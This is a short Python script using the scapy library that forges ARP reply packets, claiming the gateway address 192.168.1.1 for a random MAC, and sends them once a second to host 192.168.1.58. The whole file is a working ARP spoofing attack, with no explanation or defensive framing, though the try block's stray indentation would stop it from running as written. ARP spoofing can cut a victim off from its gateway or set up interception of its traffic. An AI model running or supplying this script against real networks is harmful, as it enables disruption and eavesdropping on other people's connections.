#!/usr/bin/env python

from scapy.all import *
import time

ip = IP(dst="192.168.1.58")

my_mac = str(RandMAC('00:21:6B'))

arp = ARP(op=2)
arp.psrc = "192.168.1.1"
arp.hwsrc = my_mac
arp.pdst = ip.dst

pkt = Ether(src=my_mac)/arp
pkt.display()

 try:
   while 1:
     sendp(pkt, verbose=1)
     time.sleep(1)
 except:
   pass
